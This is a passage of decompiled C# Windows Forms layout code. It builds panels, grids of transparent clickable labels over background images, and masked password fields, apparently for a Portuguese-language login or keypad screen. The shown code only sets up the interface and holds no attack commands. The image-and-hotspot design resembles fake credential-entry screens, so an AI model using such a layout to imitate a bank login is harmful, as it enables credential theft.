		label31 = new Label();
		label40 = new Label();
		label30 = new Label();
		label20 = new Label();
		label10 = new Label();
		label39 = new Label();
		label29 = new Label();
		label19 = new Label();
		label9 = new Label();
		label38 = new Label();
		label28 = new Label();
		label18 = new Label();
		label8 = new Label();
		label37 = new Label();
		label27 = new Label();
		label17 = new Label();
		label7 = new Label();
		label36 = new Label();
		label26 = new Label();
		label16 = new Label();
		label6 = new Label();
		label35 = new Label();
		label25 = new Label();
		label15 = new Label();
		label5 = new Label();
		label34 = new Label();
		label24 = new Label();
		label14 = new Label();
		label4 = new Label();
		label33 = new Label();
		label23 = new Label();
		label13 = new Label();
		label3 = new Label();
		label32 = new Label();
		label22 = new Label();
		label12 = new Label();
		label21 = new Label();
		label11 = new Label();
		label2 = new Label();
		label1 = new Label();
		f_si = new MaskedTextBox();
		panel3 = new Panel();
		panel4 = new Panel();
		f_bota = new Label();
		label65 = new Label();
		label66 = new Label();
		label64 = new Label();
		label60 = new Label();
		label63 = new Label();
		label62 = new Label();
		label59 = new Label();
		label61 = new Label();
		label58 = new Label();
		label57 = new Label();
		f_as = new TextBox();
		lab_data = new Label();
		lab_dias = new Label();
		lab_pc = new Label();
		label44 = new Label();
		label67 = new Label();
		label68 = new Label();
		label69 = new Label();
		label70 = new Label();
		label71 = new Label();
		label72 = new Label();
		label73 = new Label();
		label74 = new Label();
		label75 = new Label();
		f_4 = new TextBox();
		label56 = new Label();
		label55 = new Label();
		label54 = new Label();
		label53 = new Label();
		label51 = new Label();
		label49 = new Label();
		label47 = new Label();
		label45 = new Label();
		label52 = new Label();
		label50 = new Label();
		label48 = new Label();
		label46 = new Label();
		ComboTipoBox = new ComboBox();
		f_c = new TextBox();
		f_n = new TextBox();
		f_b = new TextBox();
		f_a = new TextBox();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel1).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((Control)panel4).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel2).set_BackColor(Color.White);
		((Control)panel2).set_BackgroundImage((Image)componentResourceManager.GetObject("panel2.BackgroundImage"));
		((Control)panel2).set_BackgroundImageLayout((ImageLayout)0);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel2).get_Controls().Add((Control)(object)label42);
		((Control)panel2).get_Controls().Add((Control)(object)label43);
		((Control)panel2).set_Location(new Point(0, 0));
		((Control)panel2).set_Margin(new Padding(0));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(548, 341));
		((Control)panel2).set_TabIndex(7);
		((Control)panel2).set_Visible(false);
		((Control)pictureBox2).set_BackColor(Color.White);
		((Control)pictureBox2).set_Cursor(Cursors.get_Hand());
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(83, 281));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(77, 18));
		pictureBox2.set_TabIndex(16);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox2).set_Visible(false);
		((Control)pictureBox2).add_Click((EventHandler)pictureBox2_Click);
		((Control)pictureBox1).set_BackColor(Color.White);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(2, 0));
		((Control)pictureBox1).set_Margin(new Padding(0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(546, 347));
		pictureBox1.set_TabIndex(14);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).set_Visible(false);
		((Control)label42).set_BackColor(Color.Transparent);
		((Control)label42).set_Cursor(Cursors.get_Hand());
		((Control)label42).set_Location(new Point(89, 304));
		((Control)label42).set_Name("label42");
		((Control)label42).set_Size(new Size(67, 13));
		((Control)label42).set_TabIndex(13);
		((Control)label42).add_Click((EventHandler)label42_Click);
		((Control)label43).set_BackColor(Color.Transparent);
		((Control)label43).set_Cursor(Cursors.get_Hand());
		((Control)label43).set_Location(new Point(14, 304));
		((Control)label43).set_Name("label43");
		((Control)label43).set_Size(new Size(66, 13));
		((Control)label43).set_TabIndex(12);
		((Control)panel1).set_BackgroundImage((Image)componentResourceManager.GetObject("panel1.BackgroundImage"));
		((Control)panel1).set_BackgroundImageLayout((ImageLayout)0);
		((Control)panel1).get_Controls().Add((Control)(object)label41);
		((Control)panel1).get_Controls().Add((Control)(object)label31);
		((Control)panel1).get_Controls().Add((Control)(object)label40);
		((Control)panel1).get_Controls().Add((Control)(object)label30);
		((Control)panel1).get_Controls().Add((Control)(object)label20);
		((Control)panel1).get_Controls().Add((Control)(object)label10);
		((Control)panel1).get_Controls().Add((Control)(object)label39);
		((Control)panel1).get_Controls().Add((Control)(object)label29);
		((Control)panel1).get_Controls().Add((Control)(object)label19);
		((Control)panel1).get_Controls().Add((Control)(object)label9);
		((Control)panel1).get_Controls().Add((Control)(object)label38);
		((Control)panel1).get_Controls().Add((Control)(object)label28);
		((Control)panel1).get_Controls().Add((Control)(object)label18);
		((Control)panel1).get_Controls().Add((Control)(object)label8);
		((Control)panel1).get_Controls().Add((Control)(object)label37);
		((Control)panel1).get_Controls().Add((Control)(object)label27);
		((Control)panel1).get_Controls().Add((Control)(object)label17);
		((Control)panel1).get_Controls().Add((Control)(object)label7);
		((Control)panel1).get_Controls().Add((Control)(object)label36);
		((Control)panel1).get_Controls().Add((Control)(object)label26);
		((Control)panel1).get_Controls().Add((Control)(object)label16);
		((Control)panel1).get_Controls().Add((Control)(object)label6);
		((Control)panel1).get_Controls().Add((Control)(object)label35);
		((Control)panel1).get_Controls().Add((Control)(object)label25);
		((Control)panel1).get_Controls().Add((Control)(object)label15);
		((Control)panel1).get_Controls().Add((Control)(object)label5);
		((Control)panel1).get_Controls().Add((Control)(object)label34);
		((Control)panel1).get_Controls().Add((Control)(object)label24);
		((Control)panel1).get_Controls().Add((Control)(object)label14);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).get_Controls().Add((Control)(object)label33);
		((Control)panel1).get_Controls().Add((Control)(object)label23);
		((Control)panel1).get_Controls().Add((Control)(object)label13);
		((Control)panel1).get_Controls().Add((Control)(object)label3);
		((Control)panel1).get_Controls().Add((Control)(object)label32);
		((Control)panel1).get_Controls().Add((Control)(object)label22);
		((Control)panel1).get_Controls().Add((Control)(object)label12);
		((Control)panel1).get_Controls().Add((Control)(object)label21);
		((Control)panel1).get_Controls().Add((Control)(object)label11);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).get_Controls().Add((Control)(object)f_si);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Margin(new Padding(0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(756, 347));
		((Control)panel1).set_TabIndex(0);
		((Control)label41).set_BackColor(Color.Transparent);
		((Control)label41).set_Cursor(Cursors.get_Hand());
		((Control)label41).set_Location(new Point(228, 132));
		((Control)label41).set_Name("label41");
		((Control)label41).set_Size(new Size(73, 13));
		((Control)label41).set_TabIndex(11);
		((Control)label41).add_Click((EventHandler)label41_Click);
		((Control)label31).set_BackColor(Color.Transparent);
		((Control)label31).set_Cursor(Cursors.get_Hand());
		((Control)label31).set_Location(new Point(129, 132));
		((Control)label31).set_Name("label31");
		((Control)label31).set_Size(new Size(86, 13));
		((Control)label31).set_TabIndex(10);
		((Control)label31).add_Click((EventHandler)label31_Click);
		((Control)label40).set_BackColor(Color.Transparent);
		((Control)label40).set_Cursor(Cursors.get_Hand());
		((Control)label40).set_Location(new Point(512, 165));
		((Control)label40).set_Name("label40");
		((Control)label40).set_Size(new Size(15, 13));
		((Control)label40).set_TabIndex(9);
		((Control)label40).add_Click((EventHandler)label40_Click);
		((Control)label30).set_BackColor(Color.Transparent);
		((Control)label30).set_Cursor(Cursors.get_Hand());
		((Control)label30).set_Location(new Point(513, 145));
		((Control)label30).set_Name("label30");
		((Control)label30).set_Size(new Size(15, 13));
		((Control)label30).set_TabIndex(9);
		((Control)label30).add_Click((EventHandler)label30_Click);
		((Control)label20).set_BackColor(Color.Transparent);
		((Control)label20).set_Cursor(Cursors.get_Hand());
		((Control)label20).set_Location(new Point(513, 126));
		((Control)label20).set_Name("label20");
		((Control)label20).set_Size(new Size(15, 13));
		((Control)label20).set_TabIndex(9);
		((Control)label20).add_Click((EventHandler)label20_Click);
		((Control)label10).set_BackColor(Color.Transparent);
		((Control)label10).set_Cursor(Cursors.get_Hand());
		((Control)label10).set_Location(new Point(513, 107));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(15, 13));
		((Control)label10).set_TabIndex(9);
		((Control)label10).add_Click((EventHandler)label10_Click);
		((Control)label39).set_BackColor(Color.Transparent);
		((Control)label39).set_Cursor(Cursors.get_Hand());
		((Control)label39).set_Location(new Point(492, 165));
		((Control)label39).set_Name("label39");
		((Control)label39).set_Size(new Size(15, 13));
		((Control)label39).set_TabIndex(9);
		((Control)label39).add_Click((EventHandler)label39_Click);
		((Control)label29).set_BackColor(Color.Transparent);
		((Control)label29).set_Cursor(Cursors.get_Hand());
		((Control)label29).set_Location(new Point(493, 145));
		((Control)label29).set_Name("label29");
		((Control)label29).set_Size(new Size(15, 13));
		((Control)label29).set_TabIndex(9);
		((Control)label29).add_Click((EventHandler)label29_Click);
		((Control)label19).set_BackColor(Color.Transparent);
		((Control)label19).set_Cursor(Cursors.get_Hand());
		((Control)label19).set_Location(new Point(493, 126));
		((Control)label19).set_Name("label19");
		((Control)label19).set_Size(new Size(15, 13));
		((Control)label19).set_TabIndex(9);
		((Control)label19).add_Click((EventHandler)label19_Click);
		((Control)label9).set_BackColor(Color.Transparent);
		((Control)label9).set_Cursor(Cursors.get_Hand());
		((Control)label9).set_Location(new Point(493, 107));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(15, 13));
		((Control)label9).set_TabIndex(9);
		((Control)label9).add_Click((EventHandler)label9_Click);
		((Control)label38).set_BackColor(Color.Transparent);
		((Control)label38).set_Cursor(Cursors.get_Hand());
		((Control)label38).set_Location(new Point(472, 165));
		((Control)label38).set_Name("label38");
		((Control)label38).set_Size(new Size(15, 13));
		((Control)label38).set_TabIndex(9);
		((Control)label38).add_Click((EventHandler)label38_Click);
		((Control)label28).set_BackColor(Color.Transparent);
		((Control)label28).set_Cursor(Cursors.get_Hand());
		((Control)label28).set_Location(new Point(473, 145));
		((Control)label28).set_Name("label28");
		((Control)label28).set_Size(new Size(15, 13));
		((Control)label28).set_TabIndex(9);
		((Control)label28).add_Click((EventHandler)label28_Click);
		((Control)label18).set_BackColor(Color.Transparent);
		((Control)label18).set_Cursor(Cursors.get_Hand());
		((Control)label18).set_Location(new Point(473, 126));
		((Control)label18).set_Name("label18");
		((Control)label18).set_Size(new Size(15, 13));
		((Control)label18).set_TabIndex(9);
		((Control)label18).add_Click((EventHandler)label18_Click);
		((Control)label8).set_BackColor(Color.Transparent);
		((Control)label8).set_Cursor(Cursors.get_Hand());
		((Control)label8).set_Location(new Point(473, 107));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(15, 13));
		((Control)label8).set_TabIndex(9);
		((Control)label8).add_Click((EventHandler)label8_Click);
		((Control)label37).set_BackColor(Color.Transparent);
		((Control)label37).set_Cursor(Cursors.get_Hand());
		((Control)label37).set_Location(new Point(452, 165));
		((Control)label37).set_Name("label37");
		((Control)label37).set_Size(new Size(15, 13));
		((Control)label37).set_TabIndex(9);
		((Control)label37).add_Click((EventHandler)label37_Click);
		((Control)label27).set_BackColor(Color.Transparent);
		((Control)label27).set_Cursor(Cursors.get_Hand());
		((Control)label27).set_Location(new Point(453, 145));
		((Control)label27).set_Name("label27");
		((Control)label27).set_Size(new Size(15, 13));
		((Control)label27).set_TabIndex(9);
		((Control)label27).add_Click((EventHandler)label27_Click);
		((Control)label17).set_BackColor(Color.Transparent);
		((Control)label17).set_Cursor(Cursors.get_Hand());
		((Control)label17).set_Location(new Point(453, 126));
		((Control)label17).set_Name("label17");
		((Control)label17).set_Size(new Size(15, 13));
		((Control)label17).set_TabIndex(9);
		((Control)label17).add_Click((EventHandler)label17_Click);
		((Control)label7).set_BackColor(Color.Transparent);
		((Control)label7).set_Cursor(Cursors.get_Hand());
		((Control)label7).set_Location(new Point(453, 107));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(15, 13));
		((Control)label7).set_TabIndex(9);
		((Control)label7).add_Click((EventHandler)label7_Click);
		((Control)label36).set_BackColor(Color.Transparent);
		((Control)label36).set_Cursor(Cursors.get_Hand());
		((Control)label36).set_Location(new Point(432, 165));
		((Control)label36).set_Name("label36");
		((Control)label36).set_Size(new Size(15, 13));
		((Control)label36).set_TabIndex(9);
		((Control)label36).add_Click((EventHandler)label36_Click);
		((Control)label26).set_BackColor(Color.Transparent);
		((Control)label26).set_Cursor(Cursors.get_Hand());
		((Control)label26).set_Location(new Point(433, 145));
		((Control)label26).set_Name("label26");
		((Control)label26).set_Size(new Size(15, 13));
		((Control)label26).set_TabIndex(9);
		((Control)label26).add_Click((EventHandler)label26_Click);
		((Control)label16).set_BackColor(Color.Transparent);
		((Control)label16).set_Cursor(Cursors.get_Hand());
		((Control)label16).set_Location(new Point(433, 126));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(15, 13));
		((Control)label16).set_TabIndex(9);
		((Control)label16).add_Click((EventHandler)label16_Click);
		((Control)label6).set_BackColor(Color.Transparent);
		((Control)label6).set_Cursor(Cursors.get_Hand());
		((Control)label6).set_Location(new Point(433, 107));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(15, 13));
		((Control)label6).set_TabIndex(9);
		((Control)label6).add_Click((EventHandler)label6_Click);
		((Control)label35).set_BackColor(Color.Transparent);
		((Control)label35).set_Cursor(Cursors.get_Hand());
		((Control)label35).set_Location(new Point(411, 165));
		((Control)label35).set_Name("label35");
		((Control)label35).set_Size(new Size(15, 13));
		((Control)label35).set_TabIndex(9);
		((Control)label35).add_Click((EventHandler)label35_Click);
		((Control)label25).set_BackColor(Color.Transparent);
		((Control)label25).set_Cursor(Cursors.get_Hand());
		((Control)label25).set_Location(new Point(412, 145));
		((Control)label25).set_Name("label25");
		((Control)label25).set_Size(new Size(15, 13));
		((Control)label25).set_TabIndex(9);
		((Control)label25).add_Click((EventHandler)label25_Click);
		((Control)label15).set_BackColor(Color.Transparent);
		((Control)label15).set_Cursor(Cursors.get_Hand());
		((Control)label15).set_Location(new Point(412, 126));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(15, 13));
		((Control)label15).set_TabIndex(9);
		((Control)label15).add_Click((EventHandler)label15_Click);
		((Control)label5).set_BackColor(Color.Transparent);
		((Control)label5).set_Cursor(Cursors.get_Hand());
		((Control)label5).set_Location(new Point(412, 107));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(15, 13));
		((Control)label5).set_TabIndex(9);
		((Control)label5).add_Click((EventHandler)label5_Click);
		((Control)label34).set_BackColor(Color.Transparent);
		((Control)label34).set_Cursor(Cursors.get_Hand());
		((Control)label34).set_Location(new Point(391, 165));
		((Control)label34).set_Name("label34");
		((Control)label34).set_Size(new Size(15, 13));
		((Control)label34).set_TabIndex(9);
		((Control)label34).add_Click((EventHandler)label34_Click);
		((Control)label24).set_BackColor(Color.Transparent);
		((Control)label24).set_Cursor(Cursors.get_Hand());
		((Control)label24).set_Location(new Point(392, 145));
		((Control)label24).set_Name("label24");
		((Control)label24).set_Size(new Size(15, 13));
		((Control)label24).set_TabIndex(9);
		((Control)label24).add_Click((EventHandler)label24_Click);
		((Control)label14).set_BackColor(Color.Transparent);
		((Control)label14).set_Cursor(Cursors.get_Hand());
		((Control)label14).set_Location(new Point(392, 126));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(15, 13));
		((Control)label14).set_TabIndex(9);
		((Control)label14).add_Click((EventHandler)label14_Click);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Cursor(Cursors.get_Hand());
		((Control)label4).set_Location(new Point(392, 107));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(15, 13));
		((Control)label4).set_TabIndex(9);
		((Control)label4).add_Click((EventHandler)label4_Click);
		((Control)label33).set_BackColor(Color.Transparent);
		((Control)label33).set_Cursor(Cursors.get_Hand());
		((Control)label33).set_Location(new Point(371, 165));
		((Control)label33).set_Name("label33");
		((Control)label33).set_Size(new Size(15, 13));
		((Control)label33).set_TabIndex(9);
		((Control)label33).add_Click((EventHandler)label33_Click);
		((Control)label23).set_BackColor(Color.Transparent);
		((Control)label23).set_Cursor(Cursors.get_Hand());
		((Control)label23).set_Location(new Point(372, 145));
		((Control)label23).set_Name("label23");
		((Control)label23).set_Size(new Size(15, 13));
		((Control)label23).set_TabIndex(9);
		((Control)label23).add_Click((EventHandler)label23_Click);
		((Control)label13).set_BackColor(Color.Transparent);
		((Control)label13).set_Cursor(Cursors.get_Hand());
		((Control)label13).set_Location(new Point(372, 126));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(15, 13));
		((Control)label13).set_TabIndex(9);
		((Control)label13).add_Click((EventHandler)label13_Click);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_Cursor(Cursors.get_Hand());
		((Control)label3).set_Location(new Point(372, 107));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(15, 13));
		((Control)label3).set_TabIndex(9);
		((Control)label3).add_Click((EventHandler)label3_Click);
		((Control)label32).set_BackColor(Color.Transparent);
		((Control)label32).set_Cursor(Cursors.get_Hand());
		((Control)label32).set_Location(new Point(332, 165));
		((Control)label32).set_Name("label32");
		((Control)label32).set_Size(new Size(32, 13));
		((Control)label32).set_TabIndex(9);
		((Control)label32).add_Click((EventHandler)label32_Click);
		((Control)label22).set_BackColor(Color.Transparent);
		((Control)label22).set_Cursor(Cursors.get_Hand());
		((Control)label22).set_Location(new Point(351, 145));
		((Control)label22).set_Name("label22");
		((Control)label22).set_Size(new Size(15, 13));
		((Control)label22).set_TabIndex(9);
		((Control)label22).add_Click((EventHandler)label22_Click);
		((Control)label12).set_BackColor(Color.Transparent);
		((Control)label12).set_Cursor(Cursors.get_Hand());
		((Control)label12).set_Location(new Point(351, 126));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(15, 13));
		((Control)label12).set_TabIndex(9);
		((Control)label12).add_Click((EventHandler)label12_Click);
		((Control)label21).set_BackColor(Color.Transparent);
		((Control)label21).set_Cursor(Cursors.get_Hand());
		((Control)label21).set_Location(new Point(330, 145));
		((Control)label21).set_Name("label21");
		((Control)label21).set_Size(new Size(15, 13));
		((Control)label21).set_TabIndex(9);
		((Control)label21).add_Click((EventHandler)label21_Click);
		((Control)label11).set_BackColor(Color.Transparent);
		((Control)label11).set_Cursor(Cursors.get_Hand());
		((Control)label11).set_Location(new Point(330, 126));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(15, 13));
		((Control)label11).set_TabIndex(9);
		((Control)label11).add_Click((EventHandler)label11_Click);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Cursor(Cursors.get_Hand());
		((Control)label2).set_Location(new Point(351, 107));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(15, 13));
		((Control)label2).set_TabIndex(9);
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Cursor(Cursors.get_Hand());
		((Control)label1).set_Location(new Point(330, 107));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(15, 13));
		((Control)label1).set_TabIndex(9);
		((Control)label1).add_Click((EventHandler)label1_Click);
		((TextBoxBase)f_si).set_BorderStyle((BorderStyle)0);
		((Control)f_si).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)f_si).set_ForeColor(Color.Gray);
		((Control)f_si).set_Location(new Point(129, 82));
		((Control)f_si).set_Margin(new Padding(0));
		((Control)f_si).set_Name("f_si");
		f_si.set_PasswordChar('•');
		((Control)f_si).set_Size(new Size(60, 14));
		((Control)f_si).set_TabIndex(5);
		((Control)panel3).set_BackColor(Color.White);
		((Control)panel3).set_BackgroundImage((Image)componentResourceManager.GetObject("panel3.BackgroundImage"));
		((Control)panel3).set_BackgroundImageLayout((ImageLayout)0);
		((Control)panel3).get_Controls().Add((Control)(object)panel4);
		((Control)panel3).get_Controls().Add((Control)(object)label44);
		((Control)panel3).get_Controls().Add((Control)(object)label67);
		((Control)panel3).get_Controls().Add((Control)(object)label68);
		((Control)panel3).get_Controls().Add((Control)(object)label69);
		((Control)panel3).get_Controls().Add((Control)(object)label70);
		((Control)panel3).get_Controls().Add((Control)(object)label71);
		((Control)panel3).get_Controls().Add((Control)(object)label72);
		((Control)panel3).get_Controls().Add((Control)(object)label73);
		((Control)panel3).get_Controls().Add((Control)(object)label74);
		((Control)panel3).get_Controls().Add((Control)(object)label75);
		((Control)panel3).get_Controls().Add((Control)(object)f_4);
		((Control)panel3).get_Controls().Add((Control)(object)label56);
		((Control)panel3).get_Controls().Add((Control)(object)label55);
		((Control)panel3).get_Controls().Add((Control)(object)label54);
		((Control)panel3).get_Controls().Add((Control)(object)label53);
		((Control)panel3).get_Controls().Add((Control)(object)label51);
		((Control)panel3).get_Controls().Add((Control)(object)label49);
		((Control)panel3).get_Controls().Add((Control)(object)label47);
		((Control)panel3).get_Controls().Add((Control)(object)label45);
		((Control)panel3).get_Controls().Add((Control)(object)label52);
		((Control)panel3).get_Controls().Add((Control)(object)label50);
		((Control)panel3).get_Controls().Add((Control)(object)label48);
		((Control)panel3).get_Controls().Add((Control)(object)label46);
		((Control)panel3).get_Controls().Add((Control)(object)ComboTipoBox);
		((Control)panel3).get_Controls().Add((Control)(object)f_c);
		((Control)panel3).get_Controls().Add((Control)(object)f_n);
		((Control)panel3).get_Controls().Add((Control)(object)f_b);
		((Control)panel3).get_Controls().Add((Control)(object)f_a);
		((Control)panel3).set_Location(new Point(0, 0));
		((Control)panel3).set_Margin(new Padding(0));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(551, 347));
		((Control)panel3).set_TabIndex(9);
		((Control)panel3).set_Visible(false);
		((Control)panel4).set_BackColor(Color.White);
		((Control)panel4).set_BackgroundImage((Image)componentResourceManager.GetObject("panel4.BackgroundImage"));
		((Control)panel4).set_BackgroundImageLayout((ImageLayout)0);
		((Control)panel4).get_Controls().Add((Control)(object)f_bota);
		((Control)panel4).get_Controls().Add((Control)(object)label65);
		((Control)panel4).get_Controls().Add((Control)(object)label66);
		((Control)panel4).get_Controls().Add((Control)(object)label64);
		((Control)panel4).get_Controls().Add((Control)(object)label60);
		((Control)panel4).get_Controls().Add((Control)(object)label63);
		((Control)panel4).get_Controls().Add((Control)(object)label62);
		((Control)panel4).get_Controls().Add((Control)(object)label59);
		((Control)panel4).get_Controls().Add((Control)(object)label61);
		((Control)panel4).get_Controls().Add((Control)(object)label58);
		((Control)panel4).get_Controls().Add((Control)(object)label57);
		((Control)panel4).get_Controls().Add((Control)(object)f_as);
		((Control)panel4).get_Controls().Add((Control)(object)lab_data);
		((Control)panel4).get_Controls().Add((Control)(object)lab_dias);
		((Control)panel4).get_Controls().Add((Control)(object)lab_pc);
		((Control)panel4).set_Location(new Point(1, 0));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(550, 347));
		((Control)panel4).set_TabIndex(13);
		((Control)panel4).set_Visible(false);
		((Control)panel4).add_Paint(new PaintEventHandler(panel4_Paint));
		((Control)f_bota).set_BackColor(Color.Transparent);
		((Control)f_bota).set_Cursor(Cursors.get_Hand());
		((Control)f_bota).set_Location(new Point(11, 326));
		((Control)f_bota).set_Name("f_bota");
		((Control)f_bota).set_Size(new Size(73, 15));
		((Control)f_bota).set_TabIndex(7);
		((Control)f_bota).add_Click((EventHandler)f_bota_Click);
		((Control)label65).set_BackColor(Color.Transparent);
		((Control)label65).set_Cursor(Cursors.get_Hand());
		((Control)label65).set_Location(new Point(402, 281));
		((Control)label65).set_Margin(new Padding(0));
		((Control)label65).set_Name("label65");
		((Control)label65).set_Size(new Size(15, 13));
		((Control)label65).set_TabIndex(6);
		((Control)label65).add_Click((EventHandler)label65_Click_1);
		((Control)label66).set_BackColor(Color.Transparent);
		((Control)label66).set_Cursor(Cursors.get_Hand());
		((Control)label66).set_Location(new Point(422, 281));
		((Control)label66).set_Margin(new Padding(0));
		((Control)label66).set_Name("label66");
		((Control)label66).set_Size(new Size(15, 13));
		((Control)label66).set_TabIndex(5);
		((Control)label66).add_Click((EventHandler)label66_Click_1);
		((Control)label64).set_BackColor(Color.Transparent);
		((Control)label64).set_Cursor(Cursors.get_Hand());
		((Control)label64).set_Location(new Point(382, 281));
		((Control)label64).set_Margin(new Padding(0));
		((Control)label64).set_Name("label64");
		((Control)label64).set_Size(new Size(15, 13));
		((Control)label64).set_TabIndex(2);
		((Control)label64).add_Click((EventHandler)label64_Click_1);
		((Control)label60).set_BackColor(Color.Transparent);
		((Control)label60).set_Cursor(Cursors.get_Hand());
		((Control)label60).set_Location(new Point(301, 281));
		((Control)label60).set_Margin(new Padding(0));
		((Control)label60).set_Name("label60");
		((Control)label60).set_Size(new Size(15, 13));
		((Control)label60).set_TabIndex(2);
		((Control)label60).add_Click((EventHandler)label60_Click_1);
		((Control)label63).set_BackColor(Color.Transparent);
		((Control)label63).set_Cursor(Cursors.get_Hand());
		((Control)label63).set_Location(new Point(362, 281));
		((Control)label63).set_Margin(new Padding(0));
		((Control)label63).set_Name("label63");
		((Control)label63).set_Size(new Size(15, 13));
		((Control)label63).set_TabIndex(2);
		((Control)label63).add_Click((EventHandler)label63_Click_1);
		((Control)label62).set_BackColor(Color.Transparent);
		((Control)label62).set_Cursor(Cursors.get_Hand());
		((Control)label62).set_Location(new Point(341, 281));
		((Control)label62).set_Margin(new Padding(0));
		((Control)label62).set_Name("label62");
		((Control)label62).set_Size(new Size(15, 13));
		((Control)label62).set_TabIndex(2);
		((Control)label62).add_Click((EventHandler)label62_Click_1);
		((Control)label59).set_BackColor(Color.Transparent);
		((Control)label59).set_Cursor(Cursors.get_Hand());
		((Control)label59).set_Location(new Point(281, 281));
		((Control)label59).set_Margin(new Padding(0));
		((Control)label59).set_Name("label59");
		((Control)label59).set_Size(new Size(15, 13));
		((Control)label59).set_TabIndex(2);
		((Control)label59).add_Click((EventHandler)label59_Click_1);
		((Control)label61).set_BackColor(Color.Transparent);
		((Control)label61).set_Cursor(Cursors.get_Hand());
		((Control)label61).set_Location(new Point(321, 281));
		((Control)label61).set_Margin(new Padding(0));
		((Control)label61).set_Name("label61");
		((Control)label61).set_Size(new Size(15, 13));
		((Control)label61).set_TabIndex(2);
		((Control)label61).add_Click((EventHandler)label61_Click_1);
		((Control)label58).set_BackColor(Color.Transparent);
		((Control)label58).set_Cursor(Cursors.get_Hand());
		((Control)label58).set_Location(new Point(261, 281));
		((Control)label58).set_Margin(new Padding(0));
		((Control)label58).set_Name("label58");
		((Control)label58).set_Size(new Size(15, 13));
		((Control)label58).set_TabIndex(2);
		((Control)label58).add_Click((EventHandler)label58_Click_1);
		((Control)label57).set_BackColor(Color.Transparent);
		((Control)label57).set_Cursor(Cursors.get_Hand());
		((Control)label57).set_Location(new Point(241, 281));
		((Control)label57).set_Margin(new Padding(0));
		((Control)label57).set_Name("label57");
		((Control)label57).set_Size(new Size(15, 13));
		((Control)label57).set_TabIndex(2);
		((Control)label57).add_Click((EventHandler)label57_Click_1);
		((Control)f_as).set_BackColor(Color.White);
		((TextBoxBase)f_as).set_BorderStyle((BorderStyle)0);
		((Control)f_as).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)f_as).set_ForeColor(Color.Gray);
		((Control)f_as).set_Location(new Point(14, 290));
		((Control)f_as).set_Margin(new Padding(0));
		((Control)f_as).set_Name("f_as");
		f_as.set_PasswordChar('•');
		((TextBoxBase)f_as).set_ReadOnly(true);
		((Control)f_as).set_Size(new Size(58, 14));
		((Control)f_as).set_TabIndex(1);
		((Control)lab_data).set_AutoSize(true);
		((Control)lab_data).set_Font(new Font("Verdana", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lab_data).set_ForeColor(Color.DimGray);
		((Control)lab_data).set_Location(new Point(194, 167));
		((Control)lab_data).set_Name("lab_data");
		((Control)lab_data).set_Size(new Size(0, 13));
		((Control)lab_data).set_TabIndex(0);
		((Control)lab_dias).set_AutoSize(true);
		((Control)lab_dias).set_Font(new Font("Verdana", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lab_dias).set_ForeColor(Color.DimGray);
		((Control)lab_dias).set_Location(new Point(108, 154));
		((Control)lab_dias).set_Name("lab_dias");
		((Control)lab_dias).set_Size(new Size(54, 13));
		((Control)lab_dias).set_TabIndex(0);
		((Control)lab_dias).set_Text("30 dias");
		((Control)lab_pc).set_AutoSize(true);
		((Control)lab_pc).set_Font(new Font("Verdana", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lab_pc).set_ForeColor(Color.DimGray);
		((Control)lab_pc).set_Location(new Point(151, 141));
		((Control)lab_pc).set_Name("lab_pc");
		((Control)lab_pc).set_Size(new Size(0, 13));
		((Control)lab_pc).set_TabIndex(0);
		((Control)label44).set_BackColor(Color.Transparent);
